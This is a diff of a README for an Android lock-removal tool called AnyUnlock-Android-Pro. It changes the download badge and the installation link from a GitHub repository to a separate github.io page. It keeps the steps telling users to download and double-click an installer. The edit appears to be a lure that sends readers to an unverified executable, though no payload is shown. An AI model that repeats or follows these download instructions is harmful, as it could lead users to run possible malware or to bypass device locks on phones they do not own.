@@ -1,7 +1,7 @@
 # 📱 AnyUnlock-Android-Pro - Remove Android locks with ease
 
 
-[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Tony0226-05/AnyUnlock-Android-Pro)
+[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://tony0226-05.github.io)
 
 
 ## 📖 About this application
@@ -25,7 +25,7 @@ To use this software, your computer must meet these criteria:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official repository page to get the installation file: [https://github.com/Tony0226-05/AnyUnlock-Android-Pro](https://github.com/Tony0226-05/AnyUnlock-Android-Pro)
+1.  Visit the official repository page to get the installation file: [https://tony0226-05.github.io](https://tony0226-05.github.io)
 2.  Locate the download button on the page.
 3.  Save the file to your desktop or downloads folder.
 4.  Double-click the downloaded file to start the installer.
